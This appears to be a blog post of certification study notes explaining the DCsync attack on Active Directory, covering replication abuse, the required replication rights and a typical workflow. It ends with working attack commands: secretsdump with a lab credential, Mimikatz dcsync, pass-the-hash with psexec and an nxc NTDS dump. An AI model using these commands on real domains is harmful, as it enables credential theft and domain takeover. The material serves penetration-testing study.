---
layout: post
title: DCsync Attack
date: 2025-09-29 18:00:00 +0300
categories: [Active Directory - CRTP, DCsync, DCsync Attack] # Add your new categories here
tags: [Replication, secretdump, ntds, ChangeAll]
---

**DCsync** 
abuses Active Directory replication: an attacker impersonates a domain controller and requests replication from a real DC to obtain credential material (password hashes, Kerberos keys, etc.). This lets the attacker harvest account credentials without directly compromising the domain controller’s NTDS.dit file.

**How it works (short):**

![](/photos/DCsync/Attack.jpg)

- AD replication allows DCs to exchange directory changes.
- If an account has the appropriate replication privileges, an actor can request those changes and receive sensitive secrets (NT hashes, AES keys) for domain accounts.
- This is not possible for arbitrary domain users — specific permissions are required.

**Required permissions / privileges**

(typically granted to high-privilege groups such as Domain Admins / Enterprise Admins / Domain Controllers, or explicitly delegated):

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`
- `DS-Replication-Get-Changes-In-Filtered-Set`

![](/photos/DCsync/permission.png)

**Typical workflow / examples**

1. Attacker impersonates a domain controller and requests replication from a real DC.
2. Use tools to request/collect secrets from the target DC.

Example tools / commands (formatted):

```bash
# Using Impacket's secretsdump (example placeholder)
# format may vary; adapt to your toolset/environment
secretsdump.py svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175

# Mimikatz (run on a compromised machine with appropriate privileges)
# in mimikatz interactive shell:
lsadump::dcsync /user:DOMAIN\Geno

# Use harvested hashes with psexec (Impacket) to authenticate over SMB
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' \
  -dc-ip 10.10.10.175 administrator@10.10.10.175

# Another example tool invocation (nxc.exe example from your notes)
nxc.exe smb geno.gove.local -u mikasa -p 'P@ssw0rd' --ntds

```